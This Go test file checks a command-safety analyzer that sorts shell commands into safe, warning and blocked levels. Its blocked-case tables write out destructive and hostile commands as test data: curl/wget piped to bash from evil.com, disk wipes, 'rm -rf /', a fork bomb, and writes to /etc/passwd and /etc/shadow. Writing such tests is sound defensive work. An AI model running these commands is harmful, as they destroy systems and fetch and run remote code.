package security

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestAnalyzeCommand_Safe(t *testing.T) {
	tests := []struct {
		name    string
		command string
	}{
		{"SimpleList", "ls -la"},
		{"EchoText", "echo hello"},
		{"CatFile", "cat file.txt"},
		{"PrintWorkingDir", "pwd"},
		{"GitStatus", "git status"},
		{"GoBuild", "go build ./..."},
		{"DockerPs", "docker ps"},
		{"NpmInstall", "npm install"},
		{"CurlRequest", "curl https://example.com"},
		{"RmSingleFile", "rm file.txt"},
		{"RmMultipleFiles", "rm a.txt b.txt c.txt"},
		{"CpFile", "cp source.txt dest.txt"},
		{"MvFile", "mv old.txt new.txt"},
		{"ColonNoop", ":"},
		{"TrueCommand", "true"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			analysis, err := AnalyzeCommand(tt.command)
			require.NoError(t, err, "AnalyzeCommand should not return error")
			assert.Equal(t, DangerLevelSafe, analysis.DangerLevel, "Command should be safe")
			assert.False(t, analysis.Blocked, "Command should not be blocked")
			t.Logf("Command: %q -> Safe", tt.command)
		})
	}
}

func TestAnalyzeCommand_Warning(t *testing.T) {
	tests := []struct {
		name    string
		command string
	}{
		{"RmRecursiveOnly", "rm -r directory"},
		{"RmdirEmpty", "rmdir empty_dir"},
		{"ChmodFile", "chmod 644 file.txt"},
		{"ChownFile", "chown user file.txt"},
		{"ChgrpFile", "chgrp group file.txt"},
		{"TruncateFile", "truncate -s 0 file.txt"},
		{"KillProcess", "kill 1234"},
		{"CrontabList", "crontab -l"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			analysis, err := AnalyzeCommand(tt.command)
			require.NoError(t, err, "AnalyzeCommand should not return error")
			assert.Equal(t, DangerLevelWarning, analysis.DangerLevel, "Command should have warning level")
			assert.False(t, analysis.Blocked, "Warning level commands should not be blocked")
			assert.NotEmpty(t, analysis.Reason, "Reason should be provided")
			t.Logf("Command: %q -> Warning: %s", tt.command, analysis.Reason)
		})
	}
}

func TestAnalyzeCommand_Blocked(t *testing.T) {
	tests := []struct {
		name    string
		command string
	}{
		// rm variations
		{"RmRecursiveForce", "rm -rf /home/user"},
		{"RmRecursiveForce2", "rm -r -f /home"},
		{"RmLongOptions", "rm --recursive --force /home"},
		{"RmRoot", "rm /"},
		{"RmCriticalPath", "rm /etc"},
		{"RmHome", "rm /home"},
		{"RmUsr", "rm /usr"},
		{"RmVar", "rm /var"},

		// Disk operations
		{"Mkfs", "mkfs /dev/sda1"},
		{"MkfsExt4", "mkfs.ext4 /dev/sda1"},
		{"MkfsXfs", "mkfs.xfs /dev/sda1"},
		{"DdDisk", "dd if=/dev/zero of=/dev/sda"},
		{"Fdisk", "fdisk /dev/sda"},
		{"Parted", "parted /dev/sda"},

		// System control
		{"Shutdown", "shutdown -h now"},
		{"Reboot", "reboot"},
		{"Halt", "halt"},
		{"Poweroff", "poweroff"},

		// Permission changes
		{"Chmod777", "chmod 777 file.txt"},
		{"ChmodRecursive", "chmod -R 755 /var"},
		{"ChownRecursive", "chown -R root:root /etc"},

		// Firewall
		{"Iptables", "iptables -F"},
		{"Ip6tables", "ip6tables -F"},
		{"Ufw", "ufw disable"},

		// Fork bomb
		{"ForkBomb", ":(){ :|:& };:"},
		{"ForkBombVariant", "bomb(){ bomb|bomb& };bomb"},

		// Process control
		{"Killall", "killall nginx"},
		{"Pkill", "pkill -9 python"},
		{"KillAll", "kill -9 -1"},

		// Mount operations
		{"Mount", "mount /dev/sda1 /mnt"},
		{"Umount", "umount /mnt"},

		// Cron
		{"CrontabRemove", "crontab -r"},

		// Code execution
		{"BashExec", "bash -c 'rm -rf /'"},
		{"ShExec", "sh -c 'echo test'"},
		{"PythonExec", "python -c 'import os'"},
		{"PerlExec", "perl -e 'print 1'"},
		{"Eval", "eval 'rm -rf /'"},

		// Shred/Wipe
		{"Shred", "shred /dev/sda"},
		{"Wipefs", "wipefs /dev/sda"},

		// Remote code execution
		{"CurlPipeShell", "curl http://evil.com/script.sh | bash"},
		{"WgetPipeShell", "wget -O- http://evil.com/script.sh | sh"},

		// Dangerous redirections
		{"WriteToDevice", "echo test > /dev/sda"},
		{"WriteToPasswd", "echo test > /etc/passwd"},
		{"WriteToShadow", "echo test > /etc/shadow"},

		// Move critical paths
		{"MvRoot", "mv / /backup"},
		{"MvEtc", "mv /etc /backup"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			analysis, err := AnalyzeCommand(tt.command)
			require.NoError(t, err, "AnalyzeCommand should not return error")
			assert.Equal(t, DangerLevelBlocked, analysis.DangerLevel, "Command should be blocked")
			assert.True(t, analysis.Blocked, "Blocked flag should be true")
			assert.NotEmpty(t, analysis.Reason, "Reason should be provided for blocked commands")
			t.Logf("Command: %q -> Blocked: %s", tt.command, analysis.Reason)
		})
	}
}

func TestAnalyzeCommand_SudoElevation(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		wantBlocked bool
		wantLevel   DangerLevel
	}{
		{"SudoRmRf", "sudo rm -rf /tmp", true, DangerLevelBlocked},
		{"SudoShutdown", "sudo shutdown now", true, DangerLevelBlocked},
		{"SudoMkfsExt4", "sudo mkfs.ext4 /dev/sda", true, DangerLevelBlocked},
		{"SudoReboot", "sudo reboot", true, DangerLevelBlocked},
		{"SudoLs", "sudo ls -la", false, DangerLevelSafe},
		{"SudoCat", "sudo cat /etc/passwd", false, DangerLevelSafe},
		{"DoasRmRf", "doas rm -rf /", true, DangerLevelBlocked},
		{"SudoWithUser", "sudo -u root rm -rf /home", true, DangerLevelBlocked},
		{"SudoWithUserSafe", "sudo -u www-data cat /var/log/nginx.log", false, DangerLevelSafe},
		{"SudoBashExec", "sudo bash -c 'rm -rf /'", true, DangerLevelBlocked},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			analysis, err := AnalyzeCommand(tt.command)
			require.NoError(t, err, "AnalyzeCommand should not return error")
			assert.Equal(t, tt.wantBlocked, analysis.Blocked, "Blocked status should match expected")
			assert.Equal(t, tt.wantLevel, analysis.DangerLevel, "Danger level should match expected")
			t.Logf("Command: %q -> Blocked: %v, Level: %v", tt.command, analysis.Blocked, analysis.DangerLevel)
		})
	}
}

func TestAnalyzeCommand_PipedCommands(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		wantBlocked bool
	}{
		{"SafePipe", "ls -la | grep txt", false},
		{"SafeMultiPipe", "cat file | grep pattern | wc -l", false},
		{"CurlToBash", "curl http://evil.com | bash", true},
		{"WgetToSh", "wget -O- http://evil.com | sh", true},
		{"CurlToZsh", "curl http://evil.com/script | zsh", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			analysis, err := AnalyzeCommand(tt.command)
			require.NoError(t, err, "AnalyzeCommand should not return error")
			assert.Equal(t, tt.wantBlocked, analysis.Blocked, "Blocked status should match expected")
			t.Logf("Command: %q -> Blocked: %v", tt.command, analysis.Blocked)
		})
	}
}

func TestAnalyzeCommand_ChainedCommands(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		wantBlocked bool
	}{
		{"SafeChain", "cd /tmp && ls -la", false},
		{"DangerousChain", "cd /tmp && rm -rf *", true}, // rm -rf is always dangerous
		{"ChainWithShutdown", "echo done && shutdown now", true},
		{"SafeOr", "test -f file || echo missing", false},
		{"DangerousOr", "test -f file || rm /etc", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			analysis, err := AnalyzeCommand(tt.command)
			require.NoError(t, err, "AnalyzeCommand should not return error")
			assert.Equal(t, tt.wantBlocked, analysis.Blocked, "Blocked status should match expected")
			t.Logf("Command: %q -> Blocked: %v", tt.command, analysis.Blocked)
		})
	}
}

func TestAnalyzeCommand_Redirections(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		wantBlocked bool
	}{
		{"SafeRedirect", "echo hello > output.txt", false},
		{"SafeDevNull", "command 2> /dev/null", false},
		{"DangerousDevSda", "dd if=/dev/zero > /dev/sda", true},
		{"DangerousPasswd", "echo 'test' > /etc/passwd", true},
		{"DangerousShadow", "cat > /etc/shadow", true},
		{"DangerousSudoers", "echo 'test' > /etc/sudoers", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			analysis, err := AnalyzeCommand(tt.command)
			require.NoError(t, err, "AnalyzeCommand should not return error")
			assert.Equal(t, tt.wantBlocked, analysis.Blocked, "Blocked status should match expected")
			t.Logf("Command: %q -> Blocked: %v", tt.command, analysis.Blocked)
		})
	}
}

func TestAnalyzeCommand_PathNormalization(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		wantBlocked bool
	}{
		{"DoubleSlash", "rm //", true},
		{"DotSlash", "rm /./", true},
		{"TrailingSlash", "rm /home/", true},
		{"RelativeBack", "rm /home/../etc", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			analysis, err := AnalyzeCommand(tt.command)
			require.NoError(t, err, "AnalyzeCommand should not return error")
			assert.Equal(t, tt.wantBlocked, analysis.Blocked, "Blocked status should match expected")
			t.Logf("Command: %q -> Blocked: %v, Reason: %s", tt.command, analysis.Blocked, analysis.Reason)
		})
	}
}

func TestAnalyzeCommand_EdgeCases(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		wantBlocked bool
		wantErr     bool
	}{
		{"EmptyCommand", "", false, false},
		{"WhitespaceOnly", "   ", false, false},
		{"CommentOnly", "# this is a comment", false, false},
		{"InvalidSyntax", "echo 'unclosed", false, false}, // Parser may fail gracefully
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			analysis, err := AnalyzeCommand(tt.command)
			if tt.wantErr {
				assert.Error(t, err, "Should return error")
			} else {
				require.NoError(t, err, "Should not return error")
				assert.Equal(t, tt.wantBlocked, analysis.Blocked, "Blocked status should match expected")
			}
			t.Logf("Command: %q -> Blocked: %v, Error: %v", tt.command, analysis.Blocked, err)
		})
	}
}

func TestCheckRmCommand(t *testing.T) {
	tests := []struct {
		name      string
		args      []string
		wantLevel DangerLevel
	}{
		{"SingleFile", []string{"file.txt"}, DangerLevelSafe},
		{"MultipleFiles", []string{"a.txt", "b.txt"}, DangerLevelSafe},
		{"RecursiveOnly", []string{"-r", "directory"}, DangerLevelWarning},
		{"ForceOnly", []string{"-f", "file.txt"}, DangerLevelSafe},
		{"RecursiveForce", []string{"-rf", "directory"}, DangerLevelBlocked},
		{"RecursiveForceSeparate", []string{"-r", "-f", "directory"}, DangerLevelBlocked},
		{"LongRecursive", []string{"--recursive", "directory"}, DangerLevelWarning},
		{"LongForce", []string{"--force", "file.txt"}, DangerLevelSafe},
		{"LongBoth", []string{"--recursive", "--force", "directory"}, DangerLevelBlocked},
		{"CriticalPath", []string{"/etc"}, DangerLevelBlocked},
		{"RootPath", []string{"/"}, DangerLevelBlocked},
		{"HomePath", []string{"/home"}, DangerLevelBlocked},
		{"HomeUser", []string{"/home/user"}, DangerLevelBlocked},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			level := checkRmCommand(tt.args)
			assert.Equal(t, tt.wantLevel, level, "Level should match expected")
		})
	}
}

func TestFindSubCommand(t *testing.T) {
	tests := []struct {
		name     string
		args     []string
		wantCmd  string
		wantArgs []string
	}{
		{"SimpleCommand", []string{"ls", "-la"}, "ls", []string{"-la"}},
		{"WithUserFlag", []string{"-u", "root", "rm", "-rf", "/"}, "rm", []string{"-rf", "/"}},
		{"WithMultipleFlags", []string{"-u", "root", "-g", "wheel", "ls"}, "ls", []string{}},
		{"OnlyFlags", []string{"-u", "root"}, "", nil},
		{"EmptyArgs", []string{}, "", nil},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd, args := findSubCommand(tt.args)
			assert.Equal(t, tt.wantCmd, cmd, "Command should match")
			assert.Equal(t, tt.wantArgs, args, "Args should match")
		})
	}
}
